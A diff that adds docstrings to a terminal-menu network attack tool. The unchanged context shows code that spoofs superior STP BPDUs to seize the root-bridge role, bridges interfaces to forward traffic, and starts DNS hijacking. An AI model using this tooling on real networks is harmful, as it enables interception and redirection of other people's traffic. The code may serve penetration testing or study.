@@ -54,6 +54,7 @@ Use Arrow keys to navigate and Enter to choose an option
 
 
 def hijack(event, interfaces, pkt):
+    """Sends superior BPDU packets to the specified interfaces"""
     pkt[0].src = attacks.hijack.settings.mac_address
     pkt[0].rootid = 0
     pkt[0].rootmac = attacks.hijack.settings.mac_address
@@ -70,6 +71,7 @@ def hijack(event, interfaces, pkt):
 
 
 def launch_stp_atk(interfaces):
+    """Sniffs for STP packets and starts the thread to send superior BPDU packets"""
     pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1, iface=interfaces)
     stp_thread = threading.Thread(target=hijack, args=(stop_hijack_event, interfaces, pkt,))
     stp_thread.daemon = True
@@ -77,14 +79,17 @@ def launch_stp_atk(interfaces):
 
 
 def enable_forwarding(bridge_name: str, interfaces: list):
+    """Creates a bridge and allows packet forwarding from one interface to another"""
     create_bridge.start(bridge_name, interfaces, verbose=verbose)
 
 
 def disable_forwarding(bridge_name: str):
+    """Removes the bridge. Packets will not be forwarded after this"""
     create_bridge.stop(bridge_name, verbose=verbose)
 
 
 def enable_dns_hijack(fakeip, interfaces):
+    """Starts the DNS hijacking thread"""
     global has_iptables, dns_hijack_counter
     hijack_dns.start(fakeip, interfaces, dns_hijack_counter, verbose=verbose)
     if attacks.dns.settings.use_iptables:
@@ -93,6 +98,7 @@ def enable_dns_hijack(fakeip, interfaces):
 
 
 def disable_dns_hijack():
+    """Stops the DNS hijacking"""
     global has_iptables, dns_hijack_counter
     hijack_dns.stop(dns_hijack_counter, verbose=verbose)
     if attacks.dns.settings.use_iptables:
@@ -102,6 +108,7 @@ def disable_dns_hijack():
 
 
 def display_banner(extra=""):
+    """Used to display the banner in the GUI"""
     try:
         stdscr.addstr(banner + extra)
     except Exception:
@@ -109,6 +116,7 @@ def display_banner(extra=""):
 
 
 def select_option(options, title):
+    """Asks user to select options in the GUI"""
     selection = 0
     while True:
         stdscr.clear()
@@ -177,6 +185,7 @@ def get_user_input(prompt, type_check: tuple = (int, float, str, bool, complex))
 
 
 def select_interface(n):
+    """Gets the user to choose the interface they wish to use for the attack"""
     stdscr.addstr(banner)
     interface = select_option(system_interfaces, f'Please choose an interface for interface {n}. Note that only Ethernet interfaces can be used')
     system_interfaces.remove(interface)
@@ -186,6 +195,7 @@ def select_interface(n):
 
 
 def get_iface_ip(interface):
+    """Returns the IP address of the interface"""
     try:
         if "No interface available" in interface:
             return "No interface"
@@ -195,11 +205,13 @@ def get_iface_ip(interface):
 
 
 def replace_choice(old, new):
+    """Replaces the choice in the GUI"""
     choices.insert(choices.index(old), new)
     choices.remove(old)
 
 
 def gui(stdscr_gui):
+    """Main GUI code"""
     display_banner(f"\n\nVersion: {config.version}\n\n\nPress any key to Start\n")
     stdscr_gui.getch()
 
@@ -288,6 +300,7 @@ def gui(stdscr_gui):
 
 
 def check_terminal_size(min_width, min_height):
+    """Checks the terminal size"""
     height, width = stdscr.getmaxyx()
     curses.endwin()
     if width < min_width or height < min_height:
